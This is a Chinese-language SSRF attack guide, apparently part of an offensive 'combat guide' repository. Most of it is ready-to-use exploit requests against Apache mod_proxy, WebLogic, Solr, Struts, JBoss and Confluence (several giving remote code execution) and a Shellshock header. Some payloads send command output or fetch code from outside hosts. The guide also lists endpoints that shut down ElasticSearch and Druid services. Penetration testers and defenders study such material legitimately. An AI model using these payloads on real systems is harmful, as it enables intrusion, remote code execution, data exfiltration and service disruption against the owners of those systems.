## 侧通道泄露

当利用SSRF漏洞盲注时，服务可能会泄露有关返回响应的一些信息。 例如，假设通过 XXE 进行了SSRF盲注，错误消息可能会指示是否含有漏洞：

+ 已返回回复

Error parsing request: System.Xml.XmlException: Expected DTD markup was not found. Line 1, position 1.

+ 主机和端口不可达

Error parsing request: System.Net.WebException: Unable to connect to the remote server

同样，在 XXE 之外，Web 应用程序也可能存在侧通道泄漏，可以通过检查以下方面的差异来确定：

+ 响应状态码

在线内部资产，端口响应为 200 OK;离线内部资产，端口相应为 500 Internal Server Error

+ 回复内容

响应大小（以字节为单位）的大小取决于尝试请求的 URL 是否可访问

+ 响应时间

响应时间或慢或快取决于尝试请求的 URL 是否可访问

## HTTP/HTTPS

### Apache mod_proxy

常用绑定端口:80 443

cve-2021-40438

影响 Apache <= 2.4.48

```http
/?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://SSRF_CANARY/
```

### ElasticSearch

常用绑定端口：9200

检查以下端点是否返回200:
```html
/_cluster/health
/_cat/indices
/_cat/health
```

关闭ElasticSearch实例:
```html
/_shutdown
/_cluster/nodes/_master/_shutdown
/_cluster/nodes/_shutdown
/_cluster/nodes/_all/_shutdown
```

### Weblogic

常用绑定端口：80 443 7001 8888

CVE-2014-4210

```
POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
Host: target.com
Content-Length: 137
Content-Type: application/x-www-form-urlencoded

operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

GET
```
http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&rdoSearch=name&txtSearchname=test&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search
```

CRLF
```
GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search HTTP/1.0
Host: vuln.weblogic
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Connection: close
```

 将导致以下请求
 ```bash
root@mail:~# nc -lvp 4000
Listening on [0.0.0.0] (family 0, port 4000)
Connection from example.com 43111 received!
POST /exp HTTP/1.11
X-CLRF: Injected HTTP/1.1
Content-Type: text/xml; charset=UTF-8
soapAction: ""
Content-Length: 418
User-Agent: Java1.6.0_24
Host: attacker.com:4000
Accept: text/html, image/gif, image/jpeg, */*; q=.2
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Header/><env:Body><find_business generic="2.0" xmlns="urn:uddi-org:api_v2"><name>sdf</name></find_business></env:Body></env:Envelope>
```

CVE-2020-14883

Linux:
```
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

Windows:
```
POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
Host: vulnerablehost:7001
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 117

_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
```

### Hapshicorp Consul

常用绑定端口 8500 8501

```
http://127.0.0.1:8500/? HTTP/1.1\r\nConnection: keep-alive\r\nHost: example.org\r\nContent-Length: 1\r\n\r\n1\r\nPUT /v1/agent/check/register HTTP/1.1\r\nHost: example.org\r\nContent-Length: 195\r\n\r\n\u007B\u0022id\u0022: \u0022BugCrowdDarkarnium\u0022,\u0022name\u0022: \u0022BugCrowdDarkarnium\u0022,\u0022script\u0022: \u0022/bin/uname -a | /usr/bin/curl -k -XPOST -d @- https://some-server/writer/writer.php?f=uname\u0022,\u0022interval\u0022: \u002260s\u0022,\u0022timeout\u0022: \u00225s\u0022\u007D
```

### Shellshock

常用绑定端口 80 443 8080

为了有效地测试Shellshock，需要添加包含有效负载的标头，[访问](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%89%E7%AB%A0/payloads/shellshock-cgi-paths.txt)即可查看CGI路径列表。

通过用户代理进行Shellshock
```
User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
```

### Apache Druid

常用绑定端口 80 8080 8888 8082

查看以下路径是否返回200状态码
```
/status/selfDiscovered/status
/druid/coordinator/v1/leader
/druid/coordinator/v1/metadata/datasources
/druid/indexer/v1/taskStatus
```

关闭任务，需要猜测任务ID或数据源名称
```
/druid/indexer/v1/task/{taskId}/shutdown
/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
```

关闭Apache Druid Overlords主管
```
/druid/indexer/v1/supervisor/terminateAll
/druid/indexer/v1/supervisor/{supervisorId}/shutdown
```

### Apache Solr

常用绑定端口 8983

```
/search?q=Apple&shards=http://SSRF_CANARY/solr/collection/config%23&stream.body={"set-property":{"xxx":"yyy"}}
/solr/db/select?q=orange&shards=http://SSRF_CANARY/solr/atom&qt=/select?fl=id,name:author&wt=json
/xxx?q=aaa%26shards=http://SSRF_CANARY/solr
/xxx?q=aaa&shards=http://SSRF_CANARY/solr
```

Apache Solr 7.0.1 XXE
```
/solr/gettingstarted/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'><a></a>'
/xxx?q={!type=xmlparser v="<!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'><a></a>"}
```

CVE-2019-0193

```http
GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%55%52%4c%44%61%74%61%53%6f%75%72%63%65%22%2f%3e%0d%0a%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%66%75%6e%63%74%69%6f%6e%20%66%31%28%64%61%74%61%29%7b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%5b%22%28%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%29%22%5d%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%63%22%2c%22%63%75%72%6c%20%31%32%37%2e%30%2e%30%2e%31%3a%38%39%38%34%2f%78%78%78%22%5d%29%2e%73%74%61%72%74%28%29%7d%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%75%72%6c%3d%22%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%38%39%38%33%2f%73%6f%6c%72%2f%61%64%6d%69%6e%2f%69%6e%66%6f%2f%73%79%73%74%65%6d%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%72%65%73%70%6f%6e%73%65%22%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%48%54%4d%4c%53%74%72%69%70%54%72%61%6e%73%66%6f%72%6d%65%72%2c%52%65%67%65%78%54%72%61%6e%73%66%6f%72%6d%65%72%2c%73%63%72%69%70%74%3a%66%31%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
```

测试时，请确保entity部分中指定的URL可从Solr端访问，并返回有效的XML文档已通过Xpath评估

另一种方法是使用数据源类型以及驱动程序
```http
GET /solr/db/dataimport?command=full-import&dataConfig=%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0d%0a%20%20%3c%64%61%74%61%53%6f%75%72%63%65%20%74%79%70%65%3d%22%4a%64%62%63%44%61%74%61%53%6f%75%72%63%65%22%20%64%72%69%76%65%72%3d%22%63%6f%6d%2e%73%75%6e%2e%72%6f%77%73%65%74%2e%4a%64%62%63%52%6f%77%53%65%74%49%6d%70%6c%22%20%6a%6e%64%69%4e%61%6d%65%3d%22%72%6d%69%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%3a%36%30%36%30%2f%78%78%78%22%20%61%75%74%6f%43%6f%6d%6d%69%74%3d%22%74%72%75%65%22%2f%3e%0d%0a%20%20%3c%64%6f%63%75%6d%65%6e%74%3e%0d%0a%20%20%20%20%3c%65%6e%74%69%74%79%20%6e%61%6d%65%3d%22%78%78%22%3e%0d%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0d%0a%20%20%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0d%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e
```

### PeopleSoft

常用绑定端口 80 443

XXE
```
POST /PSIGW/HttpListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<?xml version="1.0"?>
<!DOCTYPE IBRequest [
<!ENTITY x SYSTEM "http://SSRF_CANARY">
]>
<IBRequest>
   <ExternalOperationName>&x;</ExternalOperationName>
   <OperationType/>
   <From><RequestingNode/>
      <Password/>
      <OrigUser/>
      <OrigNode/>
      <OrigProcess/>
      <OrigTimeStamp/>
   </From>
   <To>
      <FinalDestination/>
      <DestinationNode/>
      <SubChannel/>
   </To>
   <ContentSections>
      <ContentSection>
         <NonRepudiation/>
         <MessageVersion/>
         <Data><![CDATA[<?xml version="1.0"?>your_message_content]]>
         </Data>
      </ContentSection>
   </ContentSections>
</IBRequest>
```

XXE
```
POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
Host: website.com
Content-Type: application/xml
...

<!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY">
```

### Apache Struts

常用绑定端口 80 443 8080 8443

Struts2-016
```
?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
```

### JBoss

常用绑定端口 80 443 8080 8443

从URL部署WAR
```
/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://SSRF_CANARY/utils/cmd.war
```

### Confluence

常用绑定端口 80 443 8080 8443

CVE-2021-26084
```
/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/doenterpagevariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
/pages/createpage.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
